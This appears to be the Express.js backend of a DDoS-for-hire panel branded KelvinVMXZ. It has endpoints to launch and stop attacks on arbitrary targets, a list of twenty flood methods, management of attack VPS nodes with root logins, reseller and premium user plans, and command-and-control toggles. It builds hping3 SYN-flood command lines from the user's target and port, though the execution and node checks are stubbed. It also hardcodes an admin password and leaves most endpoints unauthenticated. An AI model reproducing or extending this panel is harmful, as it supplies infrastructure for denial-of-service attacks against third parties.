const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');

const app = express();

// CORS middleware
app.use(cors({
  origin: '*',
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));

app.use(express.json());

// Load database files
const dbPath = path.join(__dirname, 'db');
let usersDB = [];
let vpsDB = [];
let attacksDB = [];
let plansDB = [];
let premiumDB = [];
let resellerDB = [];

// Try to load database files
try {
  if (fs.existsSync(path.join(dbPath, 'users.json'))) {
    usersDB = JSON.parse(fs.readFileSync(path.join(dbPath, 'users.json'), 'utf8'));
  }
  if (fs.existsSync(path.join(dbPath, 'vps.json'))) {
    vpsDB = JSON.parse(fs.readFileSync(path.join(dbPath, 'vps.json'), 'utf8'));
  }
  // Load other DB files similarly...
} catch (error) {
  console.log('Using default database data');
}

// Serve static files
app.use(express.static(path.join(__dirname, 'public')));

// LOG middleware
app.use((req, res, next) => {
  console.log(`${new Date().toISOString()} ${req.method} ${req.path}`);
  next();
});

// ========== AUTH ENDPOINTS ==========
app.post('/api/login', (req, res) => {
  const { username, password } = req.body || {};
  
  const userLower = (username || '').toString().toLowerCase().trim();
  const pass = (password || '').toString().trim();
  
  // Hardcoded credentials
  if (userLower === 'admin' && pass === 'kelvinvmxz') {
    return res.json({
      success: true,
      message: 'Login successful',
      token: 'kelvinvmxz_token_' + Date.now(),
      user: {
        id: 1,
        username: 'admin',
        role: 'owner',
        plan: 'ultimate',
        maxConcurrent: 10,
        maxDuration: 3600,
        email: 'admin@kelvinvmxz.com'
      }
    });
  }
  
  return res.status(401).json({ 
    error: 'Invalid username or password'
  });
});

// ========== DASHBOARD ENDPOINTS ==========
app.get('/api/dashboard', (req, res) => {
  res.json({
    stats: {
      totalUsers: usersDB.length,
      activeVPS: vpsDB.filter(v => v.status === 'online').length,
      totalVPS: vpsDB.length,
      ongoingAttacks: attacksDB.filter(a => a.status === 'running').length,
      cncStatus: 'active',
      systemUptime: 86400, // 24 hours in seconds
      totalMethods: 20
    },
    user: {
      ongoing: attacksDB.filter(a => a.userId === 1 && a.status === 'running').length,
      maxConcurrent: 10,
      maxDuration: 3600,
      plan: 'ultimate'
    },
    recentAttacks: attacksDB.slice(-5).map(attack => ({
      target: attack.target,
      method: attack.method,
      status: attack.status,
      startTime: attack.startTime,
      command: `sudo timeout ${attack.duration}s hping3 -S --flood -p ${attack.port} ${attack.target}`
    })),
    attackHistory: attacksDB.slice(-10)
  });
});

// ========== ATTACKS ENDPOINTS ==========
app.get('/api/attacks', (req, res) => {
  res.json({
    ongoing: attacksDB.filter(a => a.status === 'running'),
    history: attacksDB.filter(a => a.status !== 'running'),
    methods: [
      'syn-pps', 'syn-gbps', 'ack-pps', 'ack-gbps', 'icmp-pps', 'icmp-gbps',
      'rand-udp', 'rand-syn', 'rand-ack', 'rand-frpu', 'icmp-ts', 'rand-icmp',
      'udp-multi', 'udp-sip', 'syn-rand', 'ack-rmac', 'syn-multi', 'icmp-rand',
      'ack-rand', 'oblivion'
    ]
  });
});

app.post('/api/attack', (req, res) => {
  const { target, port, method, duration, power } = req.body;
  
  const newAttack = {
    id: Date.now(),
    target,
    port: port || 80,
    method,
    duration: duration || 60,
    power: power || 5,
    status: 'running',
    userId: 1,
    username: 'admin',
    startTime: new Date().toISOString(),
    command: `sudo timeout ${duration || 60}s hping3 -S --flood -p ${port || 80} ${target}`
  };
  
  attacksDB.push(newAttack);
  
  res.json({
    message: 'Attack launched successfully',
    attackId: newAttack.id
  });
});

app.post('/api/attack/stop/:id', (req, res) => {
  const attackId = parseInt(req.params.id);
  const attack = attacksDB.find(a => a.id === attackId);
  
  if (attack) {
    attack.status = 'stopped';
    res.json({ message: 'Attack stopped' });
  } else {
    res.status(404).json({ error: 'Attack not found' });
  }
});

app.post('/api/attack/stop-all', (req, res) => {
  attacksDB.forEach(attack => {
    if (attack.status === 'running') {
      attack.status = 'stopped';
    }
  });
  
  res.json({ message: 'All attacks stopped' });
});

// ========== VPS ENDPOINTS ==========
app.get('/api/vps', (req, res) => {
  // If no VPS data, create some sample data
  if (vpsDB.length === 0) {
    vpsDB = [
      {
        id: 1,
        host: '192.168.1.100',
        username: 'root',
        status: 'online',
        name: 'US-East-1',
        location: 'United States',
        power: 8,
        addedAt: new Date().toISOString(),
        lastSeen: new Date().toISOString(),
        activeInAttacks: 2
      },
      {
        id: 2,
        host: 'vps2.example.com',
        username: 'admin',
        status: 'offline',
        name: 'EU-West',
        location: 'Germany',
        power: 6,
        addedAt: new Date(Date.now() - 86400000).toISOString(),
        lastSeen: new Date(Date.now() - 3600000).toISOString(),
        activeInAttacks: 0
      }
    ];
  }
  
  res.json(vpsDB);
});

app.post('/api/vps', (req, res) => {
  const { host, username, password, port, name, location } = req.body;
  
  const newVPS = {
    id: Date.now(),
    host,
    username,
    port: port || 22,
    name: name || host,
    location: location || 'Unknown',
    status: 'online',
    power: 5,
    addedAt: new Date().toISOString(),
    lastSeen: new Date().toISOString(),
    activeInAttacks: 0,
    addedBy: 'admin'
  };
  
  vpsDB.push(newVPS);
  
  res.json({
    message: 'VPS added successfully',
    vps: newVPS
  });
});

app.delete('/api/vps/:id', (req, res) => {
  const vpsId = parseInt(req.params.id);
  const index = vpsDB.findIndex(v => v.id === vpsId);
  
  if (index !== -1) {
    vpsDB.splice(index, 1);
    res.json({ message: 'VPS removed successfully' });
  } else {
    res.status(404).json({ error: 'VPS not found' });
  }
});

// ========== USERS ENDPOINTS ==========
app.get('/api/users', (req, res) => {
  // If no users data, create admin + sample users
  if (usersDB.length === 0) {
    usersDB = [
      {
        id: 1,
        username: 'admin',
        email: 'admin@kelvinvmxz.com',
        role: 'owner',
        plan: 'ultimate',
        status: 'active',
        createdAt: new Date().toISOString(),
        lastLogin: new Date().toISOString(),
        maxConcurrent: 10,
        maxDuration: 3600
      },
      {
        id: 2,
        username: 'reseller1',
        email: 'reseller@example.com',
        role: 'reseller',
        plan: 'premium',
        status: 'active',
        createdAt: new Date(Date.now() - 86400000).toISOString(),
        lastLogin: new Date(Date.now() - 7200000).toISOString(),
        maxConcurrent: 5,
        maxDuration: 1800
      },
      {
        id: 3,
        username: 'user1',
        email: 'user@example.com',
        role: 'user',
        plan: 'basic',
        status: 'active',
        createdAt: new Date(Date.now() - 172800000).toISOString(),
        lastLogin: new Date(Date.now() - 14400000).toISOString(),
        maxConcurrent: 3,
        maxDuration: 600
      }
    ];
  }
  
  res.json(usersDB);
});

// ========== CNC ENDPOINTS ==========
app.get('/api/cnc/status', (req, res) => {
  res.json({ active: true });
});

app.post('/api/cnc/start', (req, res) => {
  res.json({ message: 'CNC started successfully' });
});

app.post('/api/cnc/stop', (req, res) => {
  res.json({ message: 'CNC stopped successfully' });
});

// ========== HEALTH CHECK ==========
app.get('/api/health', (req, res) => {
  res.json({ 
    status: 'OK',
    message: 'KelvinVMXZ API is running',
    timestamp: new Date().toISOString()
  });
});

// Tambahkan endpoint ini di server.js setelah endpoint lainnya:

// VPS Check All
// Tambahkan endpoint ini di server.js setelah endpoint lainnya:

// VPS Check All
app.post('/api/vps/check-all', (req, res) => {
  // Simulate checking all VPS
  vpsDB.forEach(vps => {
    vps.status = Math.random() > 0.3 ? 'online' : 'offline';
    vps.lastSeen = new Date().toISOString();
  });
  
  res.json({ 
    message: 'VPS check completed', 
    online: vpsDB.filter(v => v.status === 'online').length,
    total: vpsDB.length 
  });
});

// Check Host
app.post('/api/check-host', (req, res) => {
  const { ip, port, type } = req.body;
  
  res.json({
    success: true,
    data: {
      ip,
      port: port || 80,
      type: type || 'tcp',
      status: Math.random() > 0.5 ? 'online' : 'offline',
      responseTime: Math.random() * 100,
      timestamp: new Date().toISOString()
    }
  });
});

// Users management
app.post('/api/users', (req, res) => {
  const newUser = {
    id: Date.now(),
    ...req.body,
    createdAt: new Date().toISOString(),
    status: 'active'
  };
  
  usersDB.push(newUser);
  res.json({ message: 'User created', user: newUser });
});

app.put('/api/users/:id', (req, res) => {
  const userId = parseInt(req.params.id);
  const userIndex = usersDB.findIndex(u => u.id === userId);
  
  if (userIndex !== -1) {
    usersDB[userIndex] = { ...usersDB[userIndex], ...req.body };
    res.json({ message: 'User updated', user: usersDB[userIndex] });
  } else {
    res.status(404).json({ error: 'User not found' });
  }
});

app.delete('/api/users/:id', (req, res) => {
  const userId = parseInt(req.params.id);
  const userIndex = usersDB.findIndex(u => u.id === userId);
  
  if (userIndex !== -1) {
    // Don't allow deleting admin
    if (usersDB[userIndex].role === 'owner') {
      return res.status(400).json({ error: 'Cannot delete owner account' });
    }
    
    usersDB.splice(userIndex, 1);
    res.json({ message: 'User deleted' });
  } else {
    res.status(404).json({ error: 'User not found' });
  }
});
// ========== FALLBACK ROUTES ==========
// Handle all other API routes with 404
app.all('/api/*', (req, res) => {
  res.status(404).json({ error: 'API endpoint not found' });
});

// Serve index.html for all other routes (SPA support)
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ========== SERVER START ==========
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`📁 API available at http://localhost:${PORT}/api`);
  console.log(`🔗 Login endpoint: http://localhost:${PORT}/api/login`);
});

module.exports = app;
